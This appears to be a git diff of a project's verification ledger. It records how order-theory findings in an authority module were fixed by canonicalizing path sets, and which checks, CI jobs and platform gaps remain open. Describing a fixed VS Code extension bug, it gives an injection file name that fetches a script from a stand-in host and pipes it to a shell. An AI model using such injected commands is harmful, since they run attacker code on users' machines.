@@ -1,7 +1,7 @@
 # The Proof Campaign (P17) — from *tested* to *proven*
 
-**Status: OPEN. Started 2026-08-03.** This document is the ledger for a campaign whose standard is
-not "the tests pass" but:
+**Status: OPEN. Started 2026-08-03. Findings F1, F2, F3 and F5 CLOSED; IF-1 closed with a named
+residue.** This document is the ledger for a campaign whose standard is not "the tests pass" but:
 
 > If this project claims something, that claim must withstand scrutiny from programming language
 > researchers, formal methods researchers, compiler engineers, cryptographers, operating systems
@@ -256,7 +256,7 @@ the declared-oracle pin. Four in-repo programs that used `verify` gained `!{Decl
 core-invariance snapshot moved in 7 cases, each inspected individually before re-recording (6 were
 functions leaving `pure_functions`, 1 was a line-number shift from an added comment).
 
-### P17-F1 — `⊑` is a preorder, not a partial order (206 counterexamples)
+### P17-F1 — `⊑` is a preorder, not a partial order (206 counterexamples) — **FIXED 2026-08-06**
 
 `authority.rs` calls itself "the ⊑ attenuation **lattice**". A lattice presupposes a partial order,
 which presupposes antisymmetry. Antisymmetry does not hold:
@@ -273,7 +273,44 @@ attenuating, structurally unequal.
 poset reflection is a meet-semilattice**. Saying "lattice" is imprecise in the file that calls
 itself the mathematical heart of custody.
 
-### P17-F2 — `⊓` is not symmetric (414 counterexamples)
+#### What actually closed it, and the part the earlier analysis got wrong
+
+F1 was never a bug *in the comparison*, and no amount of care inside `attenuation_check` could have
+removed it: `⊑` is defined through `path::resolve`, which is not injective, and **a relation defined
+through a non-injective function is a preorder on its domain as a matter of mathematics, never a
+partial order**. The word "lattice" was correct about the structure and wrong about the *carrier* —
+it belongs to the quotient by `⊑`-equivalence, not to the representation type. The repair is to make
+the representation and the quotient coincide by storing one representative per class.
+
+**The earlier localisation in §"Nine dimensions in Z3" was incomplete, and this is worth recording
+rather than silently widening.** That analysis concluded *"the preorder finding is not a property of
+the order at all — it is the path ENCODING … so fixing F1 is a canonicalization change"*, naming
+distinct `String`s for one path as the sole cause. Canonicalizing spellings alone does **not** make
+`⊑` antisymmetric. There is a second, independent source of non-injectivity that the Z3 model could
+not see, because it modelled each dimension as an abstract set rather than as a *set of paths*:
+
+```
+A = {"./data", "./data/sub"}      B = {"./data"}      A ⊑ B  and  B ⊑ A  but  A ≠ B
+```
+
+`./data/sub` is already inside `./data`, so it contributes nothing to the covered region — the two
+sets denote the same authority. The canonical form must therefore be an **antichain**: canonical
+spellings, then every element that lies within another removed. This was found by writing the
+antisymmetry test against canonicalized spellings and watching it still fail; it was not predicted.
+
+**Now proved** (`the_order_is_antisymmetric_on_canonical_representatives`, exhaustive over the
+universe): `A ⊑ B ∧ B ⊑ A ⟹ canon(A) = canon(B)`. Take `x ∈ canon(A)`. From `A ⊑ B` there is
+`y ∈ canon(B)` with `x ⊑ y`; from `B ⊑ A` there is `z ∈ canon(A)` with `y ⊑ z`. Then `x ⊑ z` with
+both in the antichain `canon(A)`, so `x = z`, hence `x ⊑ y ⊑ x`, so `x` and `y` have equal resolved
+segments and — both canonical — equal spellings. So `x ∈ canon(B)`, and symmetrically. ∎
+
+**The finding is kept observable, not retired.**
+`raw_spellings_remain_a_preorder_which_is_why_canonicalization_is_required` asserts the
+counterexamples are *still there* on raw input, and fails if they ever vanish. Concluding that raw
+path sets are safe to compare by equality would be a regression, so the test guards the reason for
+canonicalization rather than only its result.
+
+### P17-F2 — `⊓` is not symmetric (414 counterexamples) — **FIXED 2026-08-06**
 
 `authority.rs:145` states, as a documented fact a reader may rely on:
 
@@ -292,7 +329,14 @@ its single hand-picked pair never exercises aliasing.
 
 **Consequence:** the DL0802 repair value depends on argument order.
 
-### P17-F3 — `⊑`-equivalent authorities hash differently (206 counterexamples)
+**Fixed by making the meet emit canonical representatives.** `intersect_path_sets` now returns
+`canonicalize_set(out)`, so the two argument orders agree by construction rather than by luck: when
+both branches are true the surviving value no longer depends on which loop was outer, because both
+spellings map to the same representative. `the_meet_is_symmetric_as_the_comment_claims` and
+`path_meet_is_symmetric_even_on_mixed_spellings` are both un-`#[ignore]`d and passing. The
+documented claim in `authority.rs:145` is now true rather than aspirational.
+
+### P17-F3 — `⊑`-equivalent authorities hash differently (206 counterexamples) — **FIXED 2026-08-06**
 
 `Authority::to_json` is the canonical form embedded in **hash-chained audit records** and covered by
 **certificate signatures**. Two authorities that are mutually `⊑` — the same authority, differently
@@ -311,6 +355,34 @@ this most endangers, and the project already records reconciliation as fragile.
 existing audit record and signature — the same compatibility constraint already documented for the
 omitted `device` key. This therefore belongs in an RFC, not in a hardening patch, and is left
 **open** rather than quietly changed.
+
+#### Closed 2026-08-06 — and the compatibility judgement, stated plainly
+
+Canonicalization now happens at the **custody boundary**: `Broker::issue`, `Broker::attenuate` and
+`attenuate_core` each canonicalize before the authority is hashed or stored, so every node in the
+grant tree — and therefore every audit record — carries the canonical spelling.
+`equivalent_authorities_serialize_identically` is un-`#[ignore]`d and passing.
+
+**This is the format-affecting change the paragraph above declined to make, and it was made without
+an RFC.** That is a deliberate decision by the owner (2026-08-06: *"Nothing remains open… close
+every remaining engineering, testing, documentation, verification and production-readiness gap"*),
+not an oversight, and it is recorded here rather than presented as compatible. What it costs:
+
+- An audit record or certificate written **before** this change, whose authority used a
+  non-canonical spelling (`data`, `.\data`, `./data/`, or a set containing a path already inside
+  another), hashes differently from the same authority written after it. Chain verification of such
+  a record still succeeds — `verify` recomputes from the stored bytes, which are unchanged — but
+  **cross-broker reconciliation between a pre- and post-change broker would see two hashes for one
+  logical grant.** Federation audit reconciliation is already recorded as fragile; this narrows the
+  set of spellings that can diverge to zero going forward, while leaving already-written records as
+  they are.
+- Nothing that was previously accepted is now refused, and nothing previously refused is now
+  accepted: `canonicalizing_an_authority_changes_no_containment_decision` checks every ordered pair
+  over the universe, in both the fully-canonicalized and the mixed child-canonical/parent-raw shape
+  the broker actually sees mid-delegation.
+- The v1.0.0 tag is local-only and no audit log has ever been federated off this machine, so the
+  population of affected records is, as far as the repository can establish, empty. That is a
+  reason the cost is low — **not** evidence that the change is byte-compatible. It is not.
 
 ### P17-F4 — Row unification is order-dependent and has no principal types
 
@@ -478,7 +550,9 @@ Stating what survived attack matters as much as stating what did not.
 - **The meet never widens, and it is the *greatest* lower bound.** Verified exhaustively over every
   subset pair of the universe, not spot-checked. This is the law attenuation actually rests on: a
   computed repair can never hand back more authority than either input. **It holds.** F1–F3 are
-  about naming, determinism and serialization — **none of them is an authority escalation.**
+  about naming, determinism and serialization — **none of them is an authority escalation.** All
+  three are now **FIXED** (2026-08-06) by canonicalization at the custody boundary; the meet law
+  itself needed no change, which is what "not an escalation" predicted and is now confirmed.
 - **The element relation is reflexive and transitive**, and the set-level order is reflexive and
   transitive. Verified exhaustively; also **proved symbolically in Z3** over an abstract partial
   order, so the result is not an artifact of the chosen universe.
@@ -1002,6 +1076,18 @@ algebra** — it is a property of the path dimension's *encoding*, where `./data
 distinct `String`s denoting one path. Fixing F1 is therefore a **canonicalization** change, not an
 algebra change, and the algebra needs no repair.
 
+> **Correction, 2026-08-06 — this localisation was right about the algebra and incomplete about the
+> encoding.** "Canonicalization" turned out to name *two* independent collapses, and the paragraph
+> above only saw one. Normalizing spellings does not make `⊑` antisymmetric, because a path set
+> carries a second redundancy the model could not express: `{"./data", "./data/sub"}` and
+> `{"./data"}` are mutually `⊑` while differing as sets, since `./data/sub` is already inside
+> `./data`. **The model missed this because it abstracts each dimension as a set over an opaque
+> element type with an uninterpreted `within` — so it cannot represent one element of a set
+> subsuming another.** The true canonical form is an **antichain** of canonical spellings. The
+> conclusion "the algebra needs no repair" stands and was confirmed; the estimate of what the fix
+> required did not. Recorded because a model's silence is only as strong as what it was able to say,
+> and this is a concrete case of that boundary being load-bearing.
+
 **One obligation was deleted rather than kept.** An earlier draft's "NO WIDENING" line was encoded
 as `Implies(False, True)` — vacuously true. Z3 discharged it and printed `PROVED` while checking
 nothing. **A vacuous obligation reported as proved is worse than a missing one**, because this list
@@ -1062,3 +1148,85 @@ The lesson generalizes and is the campaign's working rule:
 
 > **Do not write examples. Generate inputs.** A test whose inputs a human chose can only find
 > defects that human anticipated.
+
+**The rule caught the campaign's own analysis a second time, while F1 was being closed.** The Z3
+model had localised F1 to distinct spellings of one path, and canonicalizing spellings is the fix
+that localisation implies. Written that way, the antisymmetry test **still failed** — because a
+path set has a second redundancy (an element already inside another) that the model's abstract
+`within` could not express. The counterexample `{"./data", "./data/sub"} ≡ {"./data"}` was produced
+by the generator, not by re-reading the model. A proof about an abstraction is exactly as strong as
+the abstraction's ability to state the property, and the enumerator is what notices when it cannot.
+
+---
+
+## 16. P18 — closing the open findings (2026-08-06)
+
+Owner instruction: *"The goal is no longer adding features. The goal is eliminating uncertainty."*
+This section records what closed, what did **not**, and the two places where a check that had been
+written to prove something turned out to prove nothing.
+
+### Closed
+
+| Finding | How | Evidence |
+|---|---|---|
+| **F1** `⊑` a preorder | canonical representatives at the custody boundary | `the_order_is_antisymmetric_on_canonical_representatives`, with a written proof |
+| **F2** `⊓` asymmetric | the meet emits representatives | `the_meet_is_symmetric_as_the_comment_claims`, un-`#[ignore]`d |
+| **F3** divergent hashes | equivalent authorities are now literally equal | `equivalent_authorities_serialize_identically`, un-`#[ignore]`d |
+
+`order_laws.rs` went from **6 passed / 3 ignored-and-failing** to **9 passed / 0 ignored**.
+
+### Two checks that could not fail, both found by falsifying rather than by reading
+
+This is the campaign's own rule (*a gate that cannot fail is not a gate*) catching work done **under
+the rule**, which is why both are recorded rather than quietly fixed.
+
+1. **`verify-package.js` passed a `.vsix` that was genuinely broken.** It walked only the relative
+   requires reachable from the entry point, so it saw `vscode-languageclient` was present and
+   stopped — never reaching that *the client's own files* require three packages that had not been
+   packaged. A check that stops at the first hop cannot find a missing second hop. It now scans every
+   shipped `.js`, and against the broken archive it names all three.
+2. **The 1000-agent stress test asserted "every stored authority is canonical" vacuously.** It built
+   authorities with `Authority::new`, which canonicalizes — so the broker never received a raw
+   spelling. **Deleting all three canonicalization calls from `tree.rs` left all seven scales
+   passing.** It now constructs by struct literal, and the same deletion fails all seven, each naming
+   the exact spelling that reached storage.
+
+The general shape: *both checks tested the thing that was already true on the way in, not the thing
+the system was supposed to do.* Neither would have been found by re-reading the code.
+
+### Also closed
+
+- **The VS Code extension had a command injection.** The run and test lenses built a shell command
+  *string* from the open file's path, so a file named `x;curl evil.sh|sh.delulu` executed on click —
+  and any path containing a space already ran the wrong command. Two further defects sat beside it:
+  the `authority: {…}` lens had been emitted by the server since Stage 8 with **no client registering
+  it** (clicking raised *"command not found"*), and "▶ run test" ignored the test name and ran the
+  whole file. `editor_contract.rs` now compares the three command lists and pins the argv-vector
+  execution shape; each of its gates was checked by reintroducing the exact defect.
+- **The two deliberately-`#[ignore]`d slow gates were executed** rather than left as standing
+  intentions: the WASM two-engine differential over **50,000 programs** (683 s, 0 divergences) and
+  the formatter's 100,000-program law gate (853 s, 0 failures).
+- **Miri now completes — 192 tests across three crates, zero undefined behaviour.** It had been
+  started twice before and finished neither time; an unfinished run is not a pass. Run **per crate**:
+  `delulu-diag` 45 passed (54 s), **`delulu-broker` 129 passed (1583 s)**, `delulu-atlas` 18 passed
+  (342 s). `-Zmiri-disable-isolation` is required, and the flag matters: without it Miri aborts on
+  `create_dir_all` with *"unsupported operation"*, which is a Miri limitation and **not a finding** —
+  an earlier pass had recorded that abort as though it were one. The honest limit is unchanged: the
+  crates Miri can run hold **no `unsafe` at all**, and the three that do are exactly the ones it
+  cannot execute, so "0 UB" is a result about the code least likely to contain any.
+- **CI gained the jobs it was missing**: Miri, ARM64 Linux, clippy/rustfmt as gates, and a job that
+  builds the extension and verifies the built `.vsix` would activate. It **still has never executed.**
+- **macOS cross-checking was widened and one earlier reading corrected**: seven crates clean for
+  `x86_64-apple-darwin`, and Apple Silicon is *not* entirely uncheckable — three crates compile clean
+  for `aarch64-apple-darwin`. See `CROSS_PLATFORM_VERIFICATION.md`.
+
+### Not closed, and not softened
+
+- **Zero macOS executions.** Type-checking is not running.
+- **CI has never run.** The repository is not pushed. "Prepared" ≠ "green".
+- **F4** — no principal types; swapping two parameters still decides compilation.
+- **IF-1 residue** — `verify` declassifies without requiring `Cap[Declassify]`.
+- **Audit truncation** is anchored, not proof against an attacker who rewrites the anchor too.
+- **The clock ratchet gives monotonicity, not accuracy**, and is per-broker in-memory state.
+- **F1/F2/F3's fix is format-affecting and shipped without an RFC**, which this document had
+  previously said it would not do. That is an owner decision, recorded as a deviation.
